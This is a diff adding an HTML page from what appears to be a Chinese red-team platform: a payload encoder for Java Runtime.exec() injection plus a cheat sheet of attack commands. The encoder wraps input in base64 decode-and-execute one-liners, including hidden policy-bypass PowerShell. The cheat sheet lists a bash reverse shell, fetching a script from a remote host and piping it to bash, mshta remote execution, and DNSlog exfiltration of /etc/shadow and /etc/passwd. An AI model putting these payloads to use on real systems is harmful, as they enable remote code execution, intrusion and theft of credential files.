@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="zh">
+ <head> 
+  <meta charset="utf-8" /> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /> 
+  <title>java.lang.Runtime.exec（）有效载荷解决方法</title> 
+  <link rel="icon" href="static/favicon.ico" type="image/ico" /> 
+  <meta name="keywords" content="凌星阁,红队作战平台" /> 
+  <meta name="author" content="Lintstar" /> 
+  <link href="static/css/bootstrap.min.css" rel="stylesheet" /> 
+  <link href="static/css/materialdesignicons.min.css" rel="stylesheet" /> 
+  <link href="static/css/style.min.css" rel="stylesheet" /> 
+ </head> 
+ <body> 
+  <div class="container-fluid p-t-15"> 
+   <div class="row"> 
+    <div class="col-sm-6"> 
+     <div class="card"> 
+      <div class="card-header bg-primary"> 
+       <h3>Shell 编码 (Java)</h3>
+       <ul class="card-actions"> 
+       </ul> 
+      </div> 
+      <div class="card-body">
+       <h6> 有时，通过 Runtime.getRuntime().exec() 执行命令有效负载会导致失败。使用WebShell，反序列化利用或通过其他媒介时，可能会发生这种情况。</h6> 
+       <h6> 这是因为重定向和管道字符的使用方式在启动过程的上下文中没有意义。例如，ls &gt; dir_listing 在 shell 中执行应将当前目录的列表输出到名为 dir_listing 的文件中。但是在 exec() 函数的上下文中，该命令将被解释为获取 &gt; 和 dir_listing 目录的列表。</h6> 
+       <h6> StringTokenizer 类有时会破坏其中包含空格的参数，该类将命令字符串按空格分隔。诸如此类的东西 ls &quot;My Directory&quot; 将被解释为 ls '&quot;My' 'Directory&quot;'。</h6> 
+       <h6> 借助 Base64 编码，下面的转换器可以帮助减少这些问题。它可以通过调用 Bash 或 PowerShell 来制作管道并重新定向，还可以确保参数内没有空格。</h6> 
+       <br /> 
+       <div class="form-group"> 
+        <div class="wrapper wrapper-content"> 
+         <div class="row"> 
+          <div class="col-md-12 col-lg-12"> 
+           <div class="btn-group btn-group-toggle" data-toggle="buttons"> 
+            <!-- <label class="m-2 btn btn-default"> <b>Type :</b>&nbsp; </label>  -->
+            <label class="m-2 btn btn-success active"> <input type="radio" id="bash-1" name="option" value="bash-1" onclick="processInput();" checked="" /> <b>Bash-1</b>&nbsp; </label> 
+            <label class="m-2 btn btn-success"> <input type="radio" id="bash-2" name="option" value="bash-2" onclick="processInput();" /> <b>Bash-2</b>&nbsp; </label> 
+            <label class="m-2 btn btn-danger"> <input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();" /> <b>PowerShell</b>&nbsp; </label> 
+            <label class="m-2 btn btn-warning"> <input type="radio" id="python" name="option" value="python" onclick="processInput();" /> <b>Python</b>&nbsp; </label> 
+            <label class="m-2 btn btn-info"> <input type="radio" id="perl" name="option" value="perl" onclick="processInput();" /> <b>Perl</b>&nbsp; </label> 
+           </div> 
+           <div class="form-group"> 
+            <br /> 
+            <textarea class="form-control" id="input" style="margin: 6px;width:600px; height:160px;" placeholder="Type Bash here..."></textarea> 
+            <br /> 
+            <label for="exampleTextarea"><h6>编码后的结果:</h6></label> 
+            <br /> 
+            <textarea class="form-control" id="output" style="margin: 6px;width:600px; height:130px;" placeholder=""></textarea> 
+           </div> 
+          </div> 
+         </div> 
+        </div> 
+        <script>
+              var taInput = document.querySelector('textarea#input');
+              var taOutput = document.querySelector('textarea#output');
+
+              function processInput() {
+                var option = document.querySelector('input[name="option"]:checked').value;
+
+            switch (option) {
+              case 'bash-2':
+                taInput.placeholder = 'Type Bash here...'
+                taOutput.value = 'echo ' + btoa(taInput.value) + '|base64 -d|bash -i';
+                break;
+              case 'bash-1':
+                taInput.placeholder = 'Type Bash here...'
+                taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+                break;
+              case 'powershell':
+                taInput.placeholder = 'Type PowerShell here...'
+                poshInput = ''
+                for (var i = 0; i < taInput.value.length; i++) {
+                  poshInput += taInput.value[i] + unescape("%00");
+                }
+                taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+                break;
+              case 'python':
+                taInput.placeholder = 'Type Python here...'
+                taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+                break;
+              case 'perl':
+                taInput.placeholder = 'Type Perl here...'
+                taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+                break;
+              default:
+                taOutput.value = ''
+            }
+
+            if (!taInput.value) taOutput.value = '';
+
+              }
+
+              taInput.addEventListener('input', processInput, false);
+            </script> 
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+    <!-- .col-sm-6 --> 
+    <div class="col-sm-6"> 
+     <div class="card"> 
+      <div class="card-header bg-cyan"> 
+       <h3>常用命令清单</h3>
+      </div> 
+      <div class="card-body">
+       <h6>bash -i &gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1</h6>
+       <h6>curl -o /tmp/1.sh http://x.x.x.x/1.txt</h6>
+       <h6>chmod 777 /tmp/1.sh</h6>
+       <h6>ping `whoami`.key.dnslog.cn</h6> 
+       <h6>curl http://www.google.com/bash.txt|bash</h6> 
+       <h6>curl http://key.dnslog.cn/?r=`whoami`</h6> 
+       <h6>curl http://key.dnslog.cn/?r=`cat /etc/shadow|base64`</h6> 
+       <h6>curl http://key.dnslog.cn/?r=$(cat /etc/passwd|base64|tr '\n' '-')</h6> 
+       <h6>curl http://www.google.com/key.txt</h6> 
+       <h6>curl http://www.google.com/key.txt -O</h6> 
+       <h6>curl http://www.google.com/key.txt -o key.txt</h6> 
+       <h6>mshta http://127.0.0.1:80/download/file.ext</h6> 
+      </div> 
+     </div> 
+    </div> 
+    <!-- .col-sm-6 --> 
+   </div> 
+   <!-- .row --> 
+   <!-- End Cards with Actions --> 
+  </div> 
+  <script type="text/javascript" src="static/js/jquery.min.js"></script> 
+  <script type="text/javascript" src="static/js/bootstrap.min.js"></script> 
+  <script type="text/javascript" src="static/js/main.min.js"></script>  
+ </body>
+</html>
